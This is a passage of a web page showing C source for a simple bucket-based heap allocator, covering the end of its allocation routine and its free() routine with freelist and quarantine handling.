</span></span><span class=line><span class=cl>  <span class=n>alloc_size</span> <span class=o>=</span> <span class=n>__round_up_size</span><span class=p>(</span><span class=n>input_size</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>alloc</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>alloc_size</span> <span class=o>&gt;</span> <span class=n>SMALL_BUCKET_MAX_SZ</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* TODO: Not implemented */</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* Retrieve, or initialize, the appropriate bucket based on alloc_size */</span>
</span></span><span class=line><span class=cl>  <span class=n>current_bucket</span> <span class=o>=</span> <span class=n>__get_bucket</span><span class=p>(</span><span class=n>alloc_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* If the  bucket is not initialized, do it */</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>current_bucket</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>current_bucket</span> <span class=o>=</span> <span class=n>__init_bucket</span><span class=p>(</span><span class=n>alloc_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>current_bucket</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>){</span>
</span></span><span class=line><span class=cl>      <span class=n>perror</span><span class=p>(</span><span class=s>&#34;__init_bucket: mmap&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG] Bucket %zu initialized: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>alloc_size</span><span class=p>,</span> <span class=n>current_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Store the bucket inside the Bucket Master Control
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>__update_master_ctrl_bucket</span><span class=p>(</span><span class=n>alloc_size</span><span class=p>,</span> <span class=n>current_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG] current_bucket (%zu) = %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>alloc_size</span><span class=p>,</span> <span class=n>current_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>__dump_bucket</span><span class=p>(</span><span class=n>current_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* 1. Verify if we have freed allocs inside the current_bucket */</span>
</span></span><span class=line><span class=cl>  <span class=n>freelist_count</span> <span class=o>=</span> <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>freelist_count</span> <span class=o>&amp;&amp;</span> <span class=n>__is_freelist_available</span><span class=p>()){</span>
</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>=</span> <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>freelist</span><span class=p>[(</span><span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>    <span class=n>alloc</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span> <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>allocs</span> <span class=o>+</span> <span class=p>(</span> <span class=n>offset</span> <span class=o>*</span> <span class=n>alloc_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG] Alloc retrieved from the freelist with offset %ld: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>alloc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>alloc</span><span class=o>-&gt;</span><span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* 2. Verify if we can alloc from the current bucket */</span>
</span></span><span class=line><span class=cl>  <span class=n>bucket_max_allocs</span> <span class=o>=</span> <span class=n>__bucket_max_allocations</span><span class=p>(</span><span class=n>alloc_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>bucket_offset</span> <span class=o>=</span> <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>bucket_offset</span> <span class=o>!=</span> <span class=n>bucket_max_allocs</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=c1>// We still have allocs to return!
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=n>bucket_offset</span> <span class=o>&gt;</span> <span class=n>bucket_max_allocs</span><span class=p>){</span>
</span></span><span class=line><span class=cl>      <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;!! bucket_offset should never exceeds its maximum allocations!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>alloc</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>alloc</span><span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span> <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>allocs</span> <span class=o>+</span> <span class=p>(</span><span class=n>bucket_offset</span> <span class=o>*</span> <span class=n>alloc_size</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>=</span> <span class=n>alloc_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>offset</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>__dump_alloc</span><span class=p>(</span><span class=n>alloc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>alloc</span><span class=o>-&gt;</span><span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// From now on, bucket_offset == bucket_max_allocs (e.g. bucket is full)
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=cm>/* 3. If we have linked buckets, verify them as well */</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Traverse backwards first
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span><span class=p>(</span><span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>prev</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>linked_bucket</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span><span class=p>)</span> <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>prev</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=n>linked_bucket</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>){</span>
</span></span><span class=line><span class=cl>      <span class=c1>// Traverse
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG] linked bucket %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>linked_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>__dump_bucket</span><span class=p>(</span><span class=n>linked_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=k>if</span><span class=p>(</span><span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span> <span class=o>==</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>linked_bucket</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span><span class=p>)</span> <span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>prev</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      
</span></span><span class=line><span class=cl>      <span class=c1>// If here we have a freed alloc
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>offset</span> <span class=o>=</span> <span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>freelist</span><span class=p>[(</span><span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>      <span class=n>alloc</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span> <span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>allocs</span> <span class=o>+</span> <span class=p>(</span> <span class=n>offset</span> <span class=o>*</span> <span class=n>alloc_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=c1>// Verify if this bucket has enough freed allocs to replace the current bucket
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=k>if</span><span class=p>(</span><span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span> <span class=o>&gt;=</span> <span class=n>FREELIST_REPLACE_BUCKET_THRESHOLD</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>__update_master_ctrl_bucket</span><span class=p>(</span><span class=n>alloc_size</span><span class=p>,</span> <span class=n>linked_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=c1>// Return the alloation directly from here
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG] Returing alloc %p from bucket %p with traversing</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>alloc</span><span class=p>,</span> <span class=n>linked_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=n>alloc</span><span class=o>-&gt;</span><span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// Traverse forward
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span><span class=p>(</span><span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>next</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>linked_bucket</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span><span class=p>)</span> <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=n>linked_bucket</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>){</span>
</span></span><span class=line><span class=cl>      <span class=c1>// Traverse
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG] linked bucket %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>linked_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>__dump_bucket</span><span class=p>(</span><span class=n>linked_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=k>if</span><span class=p>(</span><span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span> <span class=o>==</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>linked_bucket</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span><span class=p>)</span> <span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      
</span></span><span class=line><span class=cl>      <span class=c1>// If here we have a freed alloc
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>offset</span> <span class=o>=</span> <span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>freelist</span><span class=p>[(</span><span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>      <span class=n>alloc</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span> <span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>allocs</span> <span class=o>+</span> <span class=p>(</span> <span class=n>offset</span> <span class=o>*</span> <span class=n>alloc_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=c1>// Verify if this bucket has enough freed allocs to replace the current bucket
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=k>if</span><span class=p>(</span><span class=n>linked_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span> <span class=o>&gt;=</span> <span class=n>FREELIST_REPLACE_BUCKET_THRESHOLD</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG] Master bucket updated with %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>linked_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>__update_master_ctrl_bucket</span><span class=p>(</span><span class=n>alloc_size</span><span class=p>,</span> <span class=n>linked_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=c1>// Return the alloation directly from here
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG] Returing alloc %p from bucket %p with traversing</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>alloc</span><span class=p>,</span> <span class=n>linked_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=n>alloc</span><span class=o>-&gt;</span><span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* 4. If everything fails, allocate a new bucket */</span>
</span></span><span class=line><span class=cl>  <span class=n>old_current_bucket</span> <span class=o>=</span> <span class=n>current_bucket</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>current_bucket</span> <span class=o>=</span> <span class=n>__init_bucket</span><span class=p>(</span><span class=n>alloc_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>current_bucket</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>){</span>
</span></span><span class=line><span class=cl>      <span class=n>perror</span><span class=p>(</span><span class=s>&#34;__init_bucket: mmap&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG] New bucket %zu initialized: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>alloc_size</span><span class=p>,</span> <span class=n>current_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// update list_heads
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>old_current_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>next</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>list_head</span><span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>prev</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>list_head</span><span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>old_current_bucket</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// Update the Bucket Master Control with the new bucket
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>__update_master_ctrl_bucket</span><span class=p>(</span><span class=n>alloc_size</span><span class=p>,</span> <span class=n>current_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>alloc</span> <span class=o>=</span> <span class=n>__fastpath_new_bucket_alloc</span><span class=p>(</span><span class=n>current_bucket</span><span class=p>,</span> <span class=n>alloc_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>__dump_alloc</span><span class=p>(</span><span class=n>alloc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>__dump_bucket</span><span class=p>(</span><span class=n>current_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>alloc</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>free</span><span class=p>(</span><span class=kt>void</span><span class=o>*</span> <span class=n>ptr</span><span class=p>){</span> 
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>alloc</span><span class=o>*</span> <span class=n>current_alloc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=n>current_bucket</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint16_t</span> <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>ptr</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>){</span> <span class=k>return</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>+++++++++ FREE +++++++++</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* 1. Retrieve the bucket based on the size */</span>
</span></span><span class=line><span class=cl>  <span class=n>current_alloc</span> <span class=o>=</span> <span class=n>ptr</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>alloc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG] Freeing alloc %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>current_alloc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>current_alloc</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&gt;</span> <span class=n>SMALL_BUCKET_MAX_SZ</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Should never be here since we still don&#39;t deal with that sizes
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>current_bucket</span> <span class=o>=</span> <span class=n>__get_bucket_from_alloc</span><span class=p>(</span><span class=n>current_alloc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG] Retrieved current bucket for %d is: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>current_alloc</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>,</span> <span class=n>current_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* 2. Update the bucket freelist count and freelist array */</span>
</span></span><span class=line><span class=cl>  <span class=n>offset</span> <span class=o>=</span> <span class=p>(</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span> <span class=n>current_alloc</span> <span class=o>-</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span> <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>allocs</span> <span class=p>)</span> <span class=o>/</span> <span class=n>current_alloc</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>freelist</span><span class=p>[</span><span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span><span class=p>]</span> <span class=o>=</span> <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>current_bucket</span><span class=o>-&gt;</span><span class=n>freelist_count</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>freelist_quarantine_time</span> <span class=o>=</span> <span class=n>time</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>__dump_bucket</span><span class=p>(</span><span class=n>current_bucket</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div></article><hr><div id=contact_buttons><footer><p>Powered by <a href=https://github.com/jackyzha0/quartz>Quartz</a>, Â© 2025</p><ul><li><a href=https://1day.dev/>Home</a></li><li><a href=https://twitter.com/kiks7_7>Twitter</a></li><li><a href=https://github.com/kiks7>Github</a></li><li><a href=https://linkedin.com/in/alessandro-groppo-1a0429146>Linkedin</a></li></ul></footer></div></div></body></html>